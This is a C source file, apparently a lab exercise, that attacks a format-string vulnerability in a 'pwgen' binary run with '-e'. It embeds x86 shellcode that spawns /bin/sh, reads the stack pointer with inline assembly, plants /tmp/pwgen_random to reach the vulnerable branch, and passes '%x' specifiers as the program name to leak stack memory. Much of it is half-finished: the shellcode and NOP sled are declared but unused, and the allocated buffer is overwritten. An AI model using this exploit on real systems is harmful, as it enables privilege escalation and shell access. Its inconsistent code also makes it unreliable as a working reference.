#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 100
#define NOP 0x90

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp() {
    __asm__("movl %esp,%eax");
}

// this exploits a format string vulnerability on the snprintf function on line 269 
//  which we can access by running pwgen with the "-e" argument
int main(int argc, char *argv[]) {
    char *buff, *ptr, *endofsled;
    long *addr_ptr, addr, save;
    int offset=DEFAULT_OFFSET;
    int bsize=DEFAULT_BUFFER_SIZE;
    int i;
    char *args[4];
    struct stat st; 

    remove("/tmp/pwgen_random");
    // checks if pwgen/random exists in the tmp directory
    if (stat("/tmp/pwgen_random", &st) == -1) {
        // if it does not then make one so we can trigger line 269 if statement
        mkdir("/tmp/pwgen_random", S_IRWXU);
    }

    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory. \n");
        exit(0);
    }

    addr = get_sp();
    
    //bottom of stack pointer*/
    printf("Using address: 0x%x\n", addr);
    
    buff = "%x %x %x %x";

    args[0] = buff;
    args[1] = "/usr/local/bin/pwgen";
    args[2] = "-e";
    args[3] = NULL;
    
    execve(args[1], args, NULL);
    return 1;
}

